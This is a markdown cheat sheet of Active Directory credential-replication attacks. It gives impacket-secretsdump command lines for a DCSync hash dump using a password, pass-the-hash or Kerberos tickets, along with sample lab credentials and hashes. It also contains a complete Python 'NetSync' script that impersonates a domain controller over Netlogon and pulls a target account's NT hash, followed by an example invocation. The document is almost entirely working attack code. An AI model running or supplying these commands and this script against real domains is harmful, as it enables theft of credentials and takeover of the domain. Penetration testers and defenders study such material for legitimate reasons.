# Replication

## DCSync

### Execution

```bash
############
#### UNIX ###
############
## using a plaintext password
impacket-secretsdump -outputfile $FILES_NAME "$DOMAIN"/"$USER":"$PASSWORD"@"$DOMAINCONTROLLER"
## impacket-secretsdump -outputfile contoso.dump 'CONTOSO.ORG'/'Administrator':'win2016-cli-P@$swd'@'192.168.68.64'

## with PTH (COMPUTERNAME$)
impacket-secretsdump -outputfile $FILES_NAME -hashes $LMHASH:$NTHASH $DOMAIN/"$USER"@"$DOMAINCONTROLLER"
## impacket-secretsdump -outputfile contoso.dump -hashes aad3b435b51404eeaad3b435b51404ee:d0773d3d8ae3a0f436b2b7e649faa137 'CONTOSO.ORG/WIN-NUU0DPB1BVC$@192.168.68.64'

## PTT
impacket-secretsdump -k -outputfile $FILES_NAME "$DOMAIN"/"$USER"@"$KDC_DNS_NAME"
## impacket-secretsdump -k -outputfile contoso.org.dump WIN-KML6TP4LOOL.contoso.org

## NTLM relay is POSSIBLE IF VULNERABLE TO ZEROLOGON
```

### Prerequisites

1. DS-Replication-Get-Changes (part of GenericAll on Domain object (Enterprise Admins))
2. DS-Replication-Get-Changes-All (part of GenericAll on Domain object (Enterprise Admins))

## NetSync

### Execution

```python
import argparse
import sys
from binascii import unhexlify, hexlify

from impacket.dcerpc.v5 import nrpc, epm, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.crypto import SamDecryptNTLMHash

## aes support
NEGOTIATE_FLAGS = 0x212fffff

def parse_nt(value):
  value = value.strip()
  if ':' in value:
    value = value.split(':')[1]
  return unhexlify(value)


def netsync(dc_ip, impersonate_dc, dc_nthash, target, target_type):
  impersonate_dc = impersonate_dc.rstrip('$')

  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  dce = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  dce.connect()
  dce.bind(nrpc.MSRPC_UUID_NRPC)

  client_challenge = b'12345678'
  resp = nrpc.hNetrServerReqChallenge(dce, NULL, impersonate_dc + '\x00', client_challenge)
  server_challenge = resp['ServerChallenge']

  session_key = nrpc.ComputeSessionKeyAES(None, client_challenge, server_challenge, sharedSecretHash=dc_nthash)
  client_credential = nrpc.ComputeNetlogonCredentialAES(client_challenge, session_key)

  nrpc.hNetrServerAuthenticate3(
    dce, NULL, impersonate_dc + '$\x00',
    nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
    impersonate_dc + '\x00', client_credential, NEGOTIATE_FLAGS)

  authenticator = nrpc.ComputeNetlogonAuthenticatorAES(client_credential, session_key)
  resp = nrpc.hNetrServerPasswordGet(
    dce, NULL, target + '\x00', target_type,
    impersonate_dc + '\x00', authenticator)

  encrypted_owf = resp['EncryptedNtOwfPassword']
  nt_owf = SamDecryptNTLMHash(encrypted_owf, session_key)
  return hexlify(nt_owf).decode()


def main():
  p = argparse.ArgumentParser(description='NetSync')
  p.add_argument('-dc-ip', required=True)
  p.add_argument('-impersonate-dc', required=True)
  p.add_argument('-dc-hash', required=True)
  p.add_argument('-target', required=True)
  p.add_argument('-dc-target', action='store_true')
  args = p.parse_args()

  target_type = (nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel if args.dc_target else nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel)

  try:
    nt = netsync(args.dc_ip, args.impersonate_dc, parse_nt(args.dc_hash), args.target, target_type)
  except Exception as e:
    print('netsync failed: %s' % e, file=sys.stderr)
    sys.exit(1)

  print('%s : :%s' % (args.target, nt))


if __name__ == '__main__':
  main()
```

```bash
 python3 /home/user/netsync.py \
 -dc-ip 192.168.1.11 \
 -impersonate-dc WIN-DC01$ \
 -dc-hash f604c4283015468e35aaad0e3c217092 \
 -target SRV04$
```
